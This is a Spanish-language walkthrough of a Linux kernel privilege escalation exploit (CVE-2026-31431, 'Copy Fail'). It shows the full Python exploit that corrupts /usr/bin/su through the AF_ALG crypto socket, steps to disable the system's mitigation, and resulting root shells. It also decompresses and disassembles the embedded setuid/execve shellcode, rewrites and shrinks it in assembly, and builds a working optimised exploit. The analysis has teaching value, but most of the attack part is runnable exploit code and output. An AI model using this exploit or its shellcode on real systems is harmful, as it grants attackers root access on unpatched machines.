# CVE-2026-31431 (Copy Fail) — Análisis y desarrollo en Ensamblador x86-64

Tomando como base el código fuente publicado en [Theori](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py), vamos a hacer varios ejercicios hasta pasarlo totalmente a lenguaje Ensamblador puro (sin librerías externas).

```python
#!/usr/bin/env python3
# Archivo: copyfail.py

import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
```

## Entorno de pruebas

El ejercicio lo vamos a realizar sobre la siguiente máquina.

```bash
> $ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 24.04.4 LTS
Release:        24.04
Codename:       noble

> $ uname -rm
6.19.4-061904-generic x86_64
```

## Validación de vulnerabilidad

Ejecutamos el programa en Python para validar si el sistema es vulnerable. Si da error, no es vulnerable; si abre el shell **sh**, es vulnerable.
```bash
> $ python3 copyfail.py
Traceback (most recent call last):
  File "/home/gmg/copy.fail/copyfail.py", line 11, in <module>
    while i<len(e):c(f,i,e[i:i+4]);i+=4
                   ^^^^^^^^^^^^^^^
  File "/home/gmg/copy.fail/copyfail.py", line 7, in c
    a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory
```

### Desactivar la mitigación

En esta máquina se descargó la mitigación a través de las actualizaciones automáticas de seguridad, por eso falló. Para probarlo, bajamos la defensa renombrando el archivo donde se encuentra la mitigación.
```bash
# Buscar si existe un modprobe explícito
> $ grep -r "algif" /etc/modprobe.d/
/etc/modprobe.d/disable-algif_aead.conf:# Disable algif_aead module due to CVE-2026-31431 (AKA copy.fail)
/etc/modprobe.d/disable-algif_aead.conf:install algif_aead /bin/false

# Renombrar el archivo donde se encuentra la mitigación
> $ sudo mv /etc/modprobe.d/disable-algif_aead.conf /etc/modprobe.d/disable-algif_aead.conf.bak
```
Probamos nuevamente el programa y ahora sí, nos devuelve el shell y comprobamos que somos **root**.
```bash
> $ python3 copyfail.py
# id
uid=0(root) gid=1000(gmg) groups=1000(gmg),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
# exit
```

### Reactivar la protección

Una vez finalizado el ejercicio, ejecutamos lo siguiente para activar la protección nuevamente:
```bash
> $ sudo mv /etc/modprobe.d/disable-algif_aead.conf.bak /etc/modprobe.d/disable-algif_aead.conf
> $ sudo modprobe -r algif_aead
> $ sudo sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
```

---

# Parte 1 — Del exploit en Python al payload optimizado en Ensamblador

## Análisis del payload comprimido

Lo primero que debemos analizar es de qué se trata el string que está comprimido con **zlib**. Para eso creamos un programa en Python, **decompress.py**, que lo descomprime y genera un archivo: **output.bin**.

```python
# Archivo: decompress.py

import zlib

hex_data = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"

data = zlib.decompress(bytes.fromhex(hex_data))

with open("output.bin", "wb") as f:
    f.write(data)

print(f"Archivo generado: output.bin ({len(data)} bytes)")
```

Ejecutamos y analizamos el tipo de archivo.
```bash
> $ python3 decompress.py
Archivo generado: output.bin (160 bytes)

> $ file output.bin
output.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

## Investigación del ELF

Ahora que sabemos que es un archivo **ELF 64-bit LSB executable**, vamos a investigarlo.

```bash
> $ readelf -a output.bin
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400078
  Start of program headers:          64 (bytes into file)
  Start of section headers:          0 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         1
  Size of section headers:           0 (bytes)
  Number of section headers:         0
  Section header string table index: 0

There are no sections in this file.

There are no section groups in this file.

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                 0x000000000000009e 0x000000000000009e  R E    0x1000

There is no dynamic section in this file.

There are no relocations in this file.
No processor specific unwind information to decode

Dynamic symbol information is not available for displaying symbols.

No version information found in this file.
```
La estructura ELF ocupa **120 bytes**: **ELF header** (64 bytes) + **Program header** (56 bytes). El código máquina comienza a partir del byte 120 (0x78), que coincide con el **Entry point address: 0x400078**.

### Desensamblado del código

Teniendo el **Entry point address: 0x400078**, ya podemos comenzar a desensamblar el código.

```bash
> $ objdump -D -b binary -m i386:x86-64 -M intel -z --start-address=0x78 output.bin

output.bin:     file format binary


Disassembly of section .data:

0000000000000078 <.data+0x78>:
  78:   31 c0                   xor    eax,eax
  7a:   31 ff                   xor    edi,edi
  7c:   b0 69                   mov    al,0x69
  7e:   0f 05                   syscall
  80:   48 8d 3d 0f 00 00 00    lea    rdi,[rip+0xf]        # 0x96
  87:   31 f6                   xor    esi,esi
  89:   6a 3b                   push   0x3b
  8b:   58                      pop    rax
  8c:   99                      cdq
  8d:   0f 05                   syscall
  8f:   31 ff                   xor    edi,edi
  91:   6a 3c                   push   0x3c
  93:   58                      pop    rax
  94:   0f 05                   syscall
  96:   2f                      (bad)
  97:   62 69 6e 2f 73          (bad)
  9c:   68                      .byte 0x68
  9d:   00 00                   add    BYTE PTR [rax],al
  9f:   00                      .byte 0
```

### Parámetros de objdump

Explicación de cada parámetro:

- **`-D`** — Disassemble All. Desensambla todo el contenido del archivo, no solo las secciones marcadas como código. Sin esto, `-d` solo desensambla `.text`, y como este archivo no tiene secciones ELF (es binario puro), no mostraría nada.
- **`-b binary`** — Binary format. Le dice a objdump que trate el archivo como datos crudos, sin intentar parsear headers ELF. Sin esto, objdump intentaría leer el ELF header del archivo y fallaría o desensamblaría mal.
- **`-m i386:x86-64`** — Machine architecture. Indica el set de instrucciones para desensamblar. `i386` es la familia base, `:x86-64` especifica el modo 64-bit. Es necesario cuando se usa `-b binary`, porque al no haber headers ELF, objdump no tiene forma de saber la arquitectura. Sin `-m`, asume i386 (32-bit) y el desensamblado sale mal — instrucciones de 64 bits como `lea rdi, [rip+0xf]` se decodifican como basura.
- **`-M intel`** — Syntax mode. Usa sintaxis Intel (`mov al, 0x69`) en lugar de AT&T (`mov $0x69, %al`).
- **`-z`** — Desactiva la supresión de secuencias de ceros. De esta forma muestra todo sin omitir ceros.
- **`--start-address=0x78`** — Empezar desde offset 0x78 (120 bytes). Salta los headers ELF y program header del payload, desensamblando solo el código máquina. Sin esto, desensamblaría los headers como si fueran instrucciones.

En resumen: con **`-b binary`**, el **`-m`** es obligatorio porque objdump no puede inferir la arquitectura sin un ELF header. Con un archivo ELF normal (sin `-b binary`), `-m` no hace falta porque la arquitectura está en `e_machine` del header.

El parámetro **`-z`** en este caso es fundamental, porque como vamos a ver más adelante hay ceros que se usan como padding y sin este parámetro mostraría lo que está a continuación y no tendríamos el desensamblado exacto.

```bash
  9d:   00 00                   add    BYTE PTR [rax],al
        ...
```

### Identificación del string "/bin/sh"

En la salida de objdump, vemos:
```bash
  96:   2f                      (bad)
  97:   62 69 6e 2f 73          (bad)
  9c:   68                      .byte 0x68
  9d:   00 00                   add    BYTE PTR [rax],al
  9f:   00                      .byte 0
```
y en la ubicación 0x80, tenemos:
```bash
  80:   48 8d 3d 0f 00 00 00    lea    rdi,[rip+0xf]        # 0x96
```
Interpretando esta última línea inferimos que se trata de un string, que comienza en la ubicación 0x96 y termina en 0x9F. Podemos ver el string de las siguientes formas:
```bash
> $ strings -t x output.bin
     96 /bin/sh

> $ xxd -s 0x96 -l 10 output.bin
00000096: 2f62 696e 2f73 6800 0000                 /bin/sh...
```
El primer **00** es el null terminator que marca el fin del string (**/bin/sh\0**). Los dos **00** restantes son padding de alineación.

## Código ensamblador del payload

Pasando el código en limpio nos queda así:
```assembly
; Archivo: payload.asm

BITS 64

section .text
    xor     eax, eax                 ; rax = 0
    xor     edi, edi                 ; rdi = 0
    mov     al, 0x69                 ; rax = 105 (setuid)
    syscall                          ; setuid(0)

    lea     rdi, [rel shell_string]  ; rdi -> "/bin/sh"
    xor     esi, esi                 ; rsi = 0 (argv = NULL)
    push    0x3b                     ; 59 (execve)
    pop     rax
    cdq                              ; rdx = 0 (envp = NULL)
    syscall                          ; execve("/bin/sh", NULL, NULL)

    xor     edi, edi                 ; rdi = 0
    push    0x3c                     ; 60 (exit)
    pop     rax
    syscall                          ; exit(0)

shell_string:
    db "/bin/sh", 0                  ; string con terminador NULL
    db 0, 0                          ; padding de alineación
```

> El padding asegura que el total sea divisible por 4, ya que el exploit en Python escribe el payload en el page cache en chunks de 4 bytes. Si el tamaño no fuera múltiplo de 4, el último chunk quedaría incompleto y la escritura sería incorrecta.

### Verificación de identidad con el original

Comprobamos que este código es idéntico al archivo **output.bin** que generamos a partir de descomprimir el string, compilando como binario:

```bash
> $ nasm -f bin payload.asm -o payload.bin
```

Extraemos solo el código del archivo **output.bin**. Como sabemos que los primeros 120 bytes corresponden a la estructura ELF, salteamos esa cantidad de bytes.

```bash
> $ dd if=output.bin bs=1 skip=120 > payload-original.bin
40+0 records in
40+0 records out
40 bytes copied, 0,00247062 s, 16,2 kB/s
```
Confirmamos que nuestro código es idéntico al payload original. Se muestran tres formas de hacerlo.
```bash
> $ diff -s payload-original.bin payload.bin
Files payload-original.bin and payload.bin are identical

> $ cmp -s payload-original.bin payload.bin && echo "-->> Idénticos" || echo "-->> Distintos"
-->> Idénticos

> $ md5sum payload-original.bin payload.bin | awk '{h[NR]=$1; print} END {print (h[1]==h[2]) ? "-->> Idénticos" : "-->> Distintos"}'
a48e81f49bfd55a8f7ec72a5c29a1e31  payload-original.bin
a48e81f49bfd55a8f7ec72a5c29a1e31  payload.bin
-->> Idénticos
```

## Optimización del payload

Teniendo la certeza de que el código **payload.asm** corresponde exactamente al original, vamos a optimizarlo.

```assembly
; Archivo: payload-optimized.asm

BITS 64

section .text
    xor     edi, edi                  ; rdi = 0
    push    0x69                      ; 105 (setuid)
    pop     rax                       ; rax = 105
    syscall                           ; setuid(0)

    xor     esi, esi                  ; rsi = 0 (argv = NULL)
    mov     rbx, 0x0068732f6e69622f   ; rbx = "/bin/sh\0"
    push    rbx                       ; string al stack
    push    rsp                       ; push dirección del string
    pop     rdi                       ; rdi → "/bin/sh" en stack
    push    0x3b                      ; 59 (execve)
    pop     rax
    cdq                               ; rdx = 0 (envp = NULL)
    syscall                           ; execve("/bin/sh", NULL, NULL)

    xor     edi, edi                  ; rdi = 0
    push    0x3c                      ; 60 (exit)
    pop     rax
    syscall                           ; exit(0)

    db 0                              ; padding de alineación
```
> Padding de alineación: 120 (headers) + 35 (código) = 155 -> +1 byte = 156 / 4 = 39 chunks.

En la **Parte 2** veremos en detalle el porqué de cada optimización.

Compilamos:
```bash
> $ nasm -f bin payload-optimized.asm -o payload-optimized.bin
```

### Compilación como ELF ejecutable

Para ejecutar los payloads directamente, debemos compilarlos y linkearlos de la siguiente forma:
```bash
> $ nasm -f elf64 payload.asm -o payload.o
> $ ld payload.o -o payload
ld: warning: cannot find entry symbol _start; defaulting to 0000000000401000
> $ ./payload
$

> $ nasm -f elf64 payload-optimized.asm -o payload-optimized.o
> $ ld payload-optimized.o -o payload-optimized
ld: warning: cannot find entry symbol _start; defaulting to 0000000000401000
> $ ./payload-optimized
$
```
Si queremos eliminar el warning, después de **`section .text`** deberíamos agregar las siguientes líneas:
```assembly
    global _start
_start:
```

### Construcción del ELF optimizado

Juntamos las cabeceras ELF (los primeros 120 bytes) del payload original (**output.bin**) y el payload optimizado de 36 bytes (**payload-optimized.bin**). Hacemos algunas verificaciones, asignamos permisos de ejecución y al ejecutar obtenemos el shell.
```bash
> $ { dd if=output.bin bs=1 count=120; cat payload-optimized.bin; } > payload-optimized.elf
120+0 records in
120+0 records out
120 bytes copied, 0,000526437 s, 228 kB/s

> $ ls -l payload-optimized.elf
-rw-rw-r-- 1 gmg gmg 156 may 14 17:55 payload-optimized.elf

> $ file payload-optimized.elf
payload-optimized.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header

> $ chmod +x payload-optimized.elf

> $ ./payload-optimized.elf
$
```

## Análisis de las cabeceras ELF

Al concatenar las cabeceras (120 bytes) del ELF original con nuestro payload optimizado (36 bytes), el archivo resultante tiene 156 bytes, pero los campos **p_filesz** y **p_memsz** en las cabeceras siguen indicando 158, el valor del archivo original de 160 bytes. Vamos a analizar y corregir estos campos.

Para eso necesitamos conocer las estructuras de las cabeceras de un archivo ELF.
```c
// --- ELF Header (64 bytes) ---
// Definido en <elf.h> como Elf64_Ehdr

struct Elf64_Ehdr {                     // Offset  Bytes
    unsigned char e_ident[16];          // 0x00    16
    uint16_t      e_type;               // 0x10    2
    uint16_t      e_machine;            // 0x12    2
    uint32_t      e_version;            // 0x14    4
    uint64_t      e_entry;              // 0x18    8
    uint64_t      e_phoff;              // 0x20    8
    uint64_t      e_shoff;              // 0x28    8
    uint32_t      e_flags;              // 0x30    4
    uint16_t      e_ehsize;             // 0x34    2
    uint16_t      e_phentsize;          // 0x36    2
    uint16_t      e_phnum;              // 0x38    2
    uint16_t      e_shentsize;          // 0x3A    2
    uint16_t      e_shnum;              // 0x3C    2
    uint16_t      e_shstrndx;           // 0x3E    2
};                                      // Total: 64 bytes

// --- Program Header (56 bytes) ---
// Definido en <elf.h> como Elf64_Phdr

struct Elf64_Phdr {                     // Offset  Bytes
    uint32_t      p_type;               // 0x40    4
    uint32_t      p_flags;              // 0x44    4
    uint64_t      p_offset;             // 0x48    8
    uint64_t      p_vaddr;              // 0x50    8
    uint64_t      p_paddr;              // 0x58    8
    uint64_t      p_filesz;             // 0x60    8
    uint64_t      p_memsz;              // 0x68    8
    uint64_t      p_align;              // 0x70    8
};                                      // Total: 56 bytes
```

### Campos p_filesz y p_memsz

Observamos qué valores tienen **p_filesz** y **p_memsz** del Program Header. Indican cuántos bytes del segmento existen en el archivo en disco y cuántos se reservan en memoria al cargar.

Los offsets de **p_filesz** y **p_memsz** son 0x60 y 0x68 respectivamente.
```bash
> $ xxd -s 0x60 -l 8 -p output.bin
9e00000000000000

> $ xxd -s 0x68 -l 8 -p output.bin
9e00000000000000
```

### Verificación de endianness

Visualmente notamos que los valores están en **little-endian**, ya que si estuvieran en big-endian serían valores enormes y no coincidirían con el tamaño de 160 bytes. Para confirmarlo, chequeamos qué valor tiene **e_ident[5]** del ELF header.

Los posibles valores son:

| Valor | Constante | Significado |
|---|---|---|
| 0x01 | ELFDATA2LSB | Little-endian (x86, x86-64, ARM) |
| 0x02 | ELFDATA2MSB | Big-endian (SPARC, PowerPC, MIPS BE) |

Ejecutamos:
```bash
> $ xxd -s 5 -l 1 -p output.bin
01
```

Confirmado que está en **little-endian**. Vemos los valores en decimal:
```bash
# p_filesz -> offset 0x60
> $ od -An -t u8 -j 0x60 -N 8 output.bin
                  158

# p_memsz -> offset 0x68
> $ od -An -t u8 -j 0x68 -N 8 output.bin
                  158
```

### Comparación de tamaños

Listamos los tamaños de los archivos.
```bash
> $ ls -l output.bin payload-optimized.elf
-rw-rw-r-- 1 gmg gmg 160 may 12 18:03 output.bin
-rwxrwxr-x 1 gmg gmg 156 may 14 17:55 payload-optimized.elf
```

El tamaño del archivo original es de 160 bytes, pero en la estructura tiene asignado 158 bytes. Eso se debe a que el archivo tiene dos bytes de padding al final y el autor decidió ser preciso e indicar solo los bytes que se van a cargar. Si en lugar de 158 tuviera 160, también se ejecutaría correctamente porque los dos bytes de padding no se ejecutan nunca (están después de `exit`) y tampoco se referencian.

Nuestro archivo optimizado ocupa 156 bytes y tiene un byte de padding. Siguiendo la misma línea de precisión del autor del programa, vamos a definir **p_filesz** y **p_memsz** en **155**.

### Parcheo de los campos

Convertimos 155 decimal a hexadecimal.
```bash
> $ echo "obase=16; 155" | bc
9B

# también puede ser
> $ printf '%x\n' 155
9b
```

Es una buena práctica que los campos **p_filesz** y **p_memsz** del Program Header tengan los valores correctos.
```bash
> $ printf '\x9b' | dd of=payload-optimized.elf bs=1 seek=$((0x60)) count=1 conv=notrunc
1+0 records in
1+0 records out
1 byte copied, 0,000686896 s, 1,5 kB/s

> $ printf '\x9b' | dd of=payload-optimized.elf bs=1 seek=$((0x68)) count=1 conv=notrunc
1+0 records in
1+0 records out
1 byte copied, 0,000130524 s, 7,7 kB/s
```

### Verificación de los cambios

Confirmamos que los cambios se aplicaron correctamente.
```bash
# p_filesz -> offset 0x60
> $ od -An -t u8 -j 0x60 -N 8 payload-optimized.elf
                  155

# p_memsz -> offset 0x68
> $ od -An -t u8 -j 0x68 -N 8 payload-optimized.elf
                  155
```
También lo podemos confirmar viendo el Program Header.
```bash
> $ readelf -l payload-optimized.elf

Elf file type is EXEC (Executable file)
Entry point 0x400078
There is 1 program header, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                 0x000000000000009b 0x000000000000009b  R E    0x1000
```

Lo ejecutamos y sigue funcionando correctamente.
```bash
> $ ./payload-optimized.elf
$
```

## Integración en el exploit

Creamos un programa que comprima el payload optimizado y devuelva el string hexadecimal para insertarlo en el exploit.

```python
# Archivo: compress.py

import zlib

with open("payload-optimized.elf", "rb") as f:
    data = f.read()

compressed = zlib.compress(data)

print(f"Original: {len(data)} bytes -> Comprimido: {len(compressed)} bytes")
print(compressed.hex())
```

```bash
> $ python3 compress.py
Original: 156 bytes -> Comprimido: 86 bytes
789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e0de5c16806010865f83f2b33829fd5f09bc76efda4cc3cfde20c86e090f82ceb889940c1ff59364039060003f110d6
```

Reemplazamos el string comprimido en el exploit original con el nuevo string optimizado.

```python
#!/usr/bin/env python3
# Archivo: copyfail-optimized.py

import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e0de5c16806010865f83f2b33829fd5f09bc76efda4cc3cfde20c86e090f82ceb889940c1ff59364039060003f110d6"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
```

Probamos el exploit con el payload optimizado y confirmamos que funciona correctamente.
```bash
> $ python3 copyfail-optimized.py
# id
uid=0(root) gid=1000(gmg) groups=1000(gmg),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
# exit
```

> ⚠️ No olvidar [reactivar la protección](#reactivar-la-protección) una vez finalizada la prueba.
